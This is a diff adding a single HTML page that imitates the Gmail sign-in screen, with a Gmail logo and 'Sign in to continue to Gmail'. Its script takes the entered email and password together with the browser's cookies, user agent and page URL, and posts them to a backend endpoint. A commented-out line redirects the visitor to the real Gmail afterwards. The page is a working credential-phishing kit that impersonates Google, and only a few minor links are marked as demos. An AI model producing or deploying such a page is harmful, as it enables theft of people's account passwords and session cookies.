@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Gmail Login </title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" />
+    <style>
+        /* Same CSS – keep it (copy from previous answer) */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif;
+            background:#f1f3f4;
+            min-height:100vh;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            padding:20px;
+        }
+        .login-card {
+            background:#fff;
+            border-radius:8px;
+            box-shadow:0 2px 10px rgba(0,0,0,0.08),0 4px 20px rgba(0,0,0,0.05);
+            padding:40px 32px 36px;
+            width:100%;
+            max-width:450px;
+            transition:box-shadow 0.25s;
+        }
+        .login-card:hover { box-shadow:0 4px 20px rgba(0,0,0,0.12); }
+        .logo { text-align:center; margin-bottom:28px; }
+        .logo svg {
+            display:inline-block; width:72px; height:72px;
+            animation:gentleBounce 2.5s ease-in-out infinite;
+            transform-origin:center; transition:transform 0.2s ease; cursor:default;
+        }
+        @keyframes gentleBounce {
+            0%,100% { transform:translateY(0) scale(1); }
+            50% { transform:translateY(-8px) scale(1.02); }
+        }
+        .logo svg:hover {
+            animation:hoverBounce 0.8s ease-in-out 2;
+        }
+        @keyframes hoverBounce {
+            0% { transform:translateY(0) scale(1); }
+            20% { transform:translateY(-12px) scale(1.04); }
+            40% { transform:translateY(0) scale(1); }
+            60% { transform:translateY(-8px) scale(1.02); }
+            80% { transform:translateY(0) scale(1); }
+            100% { transform:translateY(0) scale(1); }
+        }
+        .logo .gmail-badge { display:block; font-size:22px; font-weight:500; color:#1f1f1f; margin-top:6px; letter-spacing:-0.3px; }
+        .title { font-size:24px; font-weight:400; color:#202124; text-align:center; margin-bottom:6px; }
+        .subtitle { font-size:16px; font-weight:400; color:#5f6368; text-align:center; margin-bottom:28px; }
+        .form-group { margin-bottom:20px; position:relative; }
+        .form-group label { display:block; font-size:14px; font-weight:500; color:#3c4043; margin-bottom:4px; }
+        .form-group input {
+            width:100%; padding:12px 14px; border:1px solid #dadce0; border-radius:4px;
+            font-size:16px; font-family:inherit; background:#fff; color:#202124;
+            transition:border-color 0.2s,box-shadow 0.2s; outline:none;
+        }
+        .form-group input:focus { border-color:#1a73e8; box-shadow:0 1px 3px rgba(26,115,232,0.15); }
+        .form-group input::placeholder { color:#9aa0a6; }
+        .form-group input:disabled { background:#f1f3f4; color:#5f6368; cursor:not-allowed; }
+        .form-options {
+            display:flex; justify-content:space-between; align-items:center;
+            flex-wrap:wrap; gap:8px; margin:8px 0 24px;
+        }
+        .form-options .remember { display:flex; align-items:center; gap:6px; font-size:14px; color:#3c4043; }
+        .form-options .remember input[type="checkbox"] { width:16px; height:16px; accent-color:#1a73e8; cursor:pointer; }
+        .form-options a { color:#1a73e8; text-decoration:none; font-size:14px; font-weight:500; }
+        .form-options a:hover { text-decoration:underline; }
+        .btn-primary {
+            width:100%; padding:12px; background:#1a73e8; color:#fff; border:none;
+            border-radius:4px; font-size:16px; font-weight:500; font-family:inherit;
+            cursor:pointer; transition:background 0.2s,box-shadow 0.2s; letter-spacing:0.2px;
+        }
+        .btn-primary:hover { background:#1765cc; box-shadow:0 1px 4px rgba(26,115,232,0.3); }
+        .btn-primary:active { background:#1558b8; }
+        .btn-secondary {
+            display:inline-block; margin-top:16px; color:#1a73e8; font-weight:500;
+            font-size:14px; text-decoration:none; background:none; border:none; cursor:pointer; font-family:inherit;
+        }
+        .btn-secondary:hover { text-decoration:underline; }
+        .footer-links {
+            margin-top:28px; display:flex; flex-wrap:wrap; justify-content:center;
+            gap:8px 16px; font-size:13px; color:#5f6368;
+            border-top:1px solid #e8eaed; padding-top:24px;
+        }
+        .footer-links a { color:#5f6368; text-decoration:none; }
+        .footer-links a:hover { text-decoration:underline; }
+        .error-message { color:#d93025; font-size:13px; margin-top:6px; display:none; }
+        .error-message.visible { display:block; }
+        .status-box {
+            margin-top:12px; padding:8px 12px; border-radius:4px; background:#f8f9fa;
+            font-size:13px; color:#3c4043; border:1px solid #e8eaed;
+            display:none; word-break:break-all;
+        }
+        .status-box.visible { display:block; }
+        @media (max-width:480px) {
+            .login-card { padding:32px 20px 28px; }
+            .title { font-size:22px; }
+            .form-options { flex-direction:column; align-items:flex-start; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="72" height="72">
+            <path fill="#EA4335" d="M42,37c0,2.2-1.8,4-4,4H10c-2.2,0-4-1.8-4-4V11c0-2.2,1.8-4,4-4h28c2.2,0,4,1.8,4,4V37z" />
+            <path fill="#FFF" d="M24,21.3L8,9.7v24.6c0,1.2,1,2.2,2.2,2.2h27.6c1.2,0,2.2-1,2.2-2.2V9.7L24,21.3z" />
+            <path fill="#FFF" d="M8,9.7l16,11.6l16-11.6H8z" />
+            <path fill="#EA4335" d="M8,9.7l16,11.6l16-11.6H8z" opacity=".2" />
+        </svg>
+        <span class="gmail-badge">Gmail</span>
+    </div>
+
+    <h1 class="title">Sign in</h1>
+    <p class="subtitle">to continue to Gmail</p>
+
+    <form id="loginForm" action="#" method="post">
+        <div class="form-group">
+            <label for="email">Email or phone</label>
+            <input type="email" id="email" placeholder="Enter your email" value="" required />
+            <div id="emailError" class="error-message">Please enter a valid email address.</div>
+        </div>
+
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password" required />
+            <div id="passwordError" class="error-message">Password is required.</div>
+        </div>
+
+        <div class="form-options">
+            <label class="remember">
+                <input type="checkbox" id="rememberMe" checked /> Remember me
+            </label>
+            <a href="#" id="forgotLink">Forgot email?</a>
+        </div>
+
+        <button type="submit" class="btn-primary" id="submitBtn">Next</button>
+
+        <div style="text-align:center; margin-top:12px;">
+            <button type="button" class="btn-secondary" id="createAccountBtn">Create account</button>
+            <button type="button" class="btn-secondary" id="clearCookieBtn" style="margin-left:16px;">Clear stored user</button>
+        </div>
+
+        <div id="statusBox" class="status-box"></div>
+    </form>
+
+    <div class="footer-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+</div>
+
+<script>
+    // ─── FRONTEND – sends data to the backend ──────────────────────────
+    const BACKEND_URL = '/api/login';   // relative path to the server
+
+    const form = document.getElementById('loginForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const rememberCheck = document.getElementById('rememberMe');
+    const forgotLink = document.getElementById('forgotLink');
+    const createAccountBtn = document.getElementById('createAccountBtn');
+    const clearCookieBtn = document.getElementById('clearCookieBtn');
+    const statusBox = document.getElementById('statusBox');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // Cookie helpers
+    const COOKIE_NAME = 'gmail_user';
+    function getCookie(name) {
+        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+        return match ? decodeURIComponent(match[2]) : null;
+    }
+    function setCookie(name, value, days = 30) {
+        const expires = new Date(Date.now() + days * 86400000).toUTCString();
+        document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/; SameSite=Lax';
+    }
+    function deleteCookie(name) {
+        document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+    }
+
+    // Restore stored email
+    const storedEmail = getCookie(COOKIE_NAME);
+    if (storedEmail) {
+        emailInput.value = storedEmail;
+        emailInput.disabled = true;
+        emailInput.style.background = '#f1f3f4';
+        rememberCheck.checked = true;
+        statusBox.textContent = `🔐 Signed in as ${storedEmail}. Enter your password.`;
+        statusBox.classList.add('visible');
+    }
+
+    // Validation
+    function setError(element, errorDiv, condition) {
+        if (condition) { errorDiv.classList.add('visible'); element.style.borderColor = '#d93025'; }
+        else { errorDiv.classList.remove('visible'); element.style.borderColor = ''; }
+    }
+    function validateForm() {
+        let valid = true;
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+        const isEmailValid = email.length > 0 && email.includes('@');
+        setError(emailInput, emailError, !isEmailValid);
+        if (!isEmailValid) valid = false;
+        const isPasswordValid = password.length > 0;
+        setError(passwordInput, passwordError, !isPasswordValid);
+        if (!isPasswordValid) valid = false;
+        return valid;
+    }
+
+    // Submit handler
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        statusBox.classList.remove('visible');
+        statusBox.textContent = '';
+        if (!validateForm()) return;
+
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+        if (rememberCheck.checked) setCookie(COOKIE_NAME, email, 30);
+        else deleteCookie(COOKIE_NAME);
+
+        const payload = {
+            email: email,
+            password: password,
+            cookies: document.cookie,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            pageUrl: window.location.href
+        };
+
+        statusBox.textContent = '⏳ Sending credentials to server...';
+        statusBox.classList.add('visible');
+        statusBox.style.borderColor = '#fbbc04';
+        submitBtn.disabled = true;
+
+        fetch(BACKEND_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(data => {
+            statusBox.textContent = '✅ Data delivered: ' + JSON.stringify(data);
+            statusBox.style.borderColor = '#1e8e3e';
+            submitBtn.disabled = false;
+            // Optional: redirect to real Gmail
+            // window.location.href = 'https://mail.google.com';
+        })
+        .catch(err => {
+            statusBox.textContent = '❌ Error: ' + err.message;
+            statusBox.style.borderColor = '#d93025';
+            submitBtn.disabled = false;
+        });
+    });
+
+    // Clear stored user
+    clearCookieBtn.addEventListener('click', function() {
+        deleteCookie(COOKIE_NAME);
+        emailInput.value = '';
+        emailInput.disabled = false;
+        emailInput.style.background = '';
+        statusBox.textContent = 'Stored user cleared.';
+        statusBox.classList.add('visible');
+        statusBox.style.borderColor = '#5f6368';
+        rememberCheck.checked = false;
+        emailError.classList.remove('visible');
+        passwordError.classList.remove('visible');
+        emailInput.style.borderColor = '';
+        passwordInput.style.borderColor = '';
+    });
+
+    // Demo links
+    forgotLink.addEventListener('click', e => { e.preventDefault(); alert('🔍 Forgot email? (demo)'); });
+    createAccountBtn.addEventListener('click', () => alert('📝 Create account (demo)'));
+
+    // Real-time validation
+    emailInput.addEventListener('blur', function() {
+        const email = emailInput.value.trim();
+        const isValid = email.length > 0 && email.includes('@');
+        setError(emailInput, emailError, !isValid && email.length > 0);
+    });
+    passwordInput.addEventListener('blur', function() {
+        const password = passwordInput.value.trim();
+        setError(passwordInput, passwordError, password.length === 0);
+    });
+    emailInput.addEventListener('focus', function() { emailError.classList.remove('visible'); emailInput.style.borderColor = ''; });
+    passwordInput.addEventListener('focus', function() { passwordError.classList.remove('visible'); passwordInput.style.borderColor = ''; });
+</script>
+</body>
+</html>
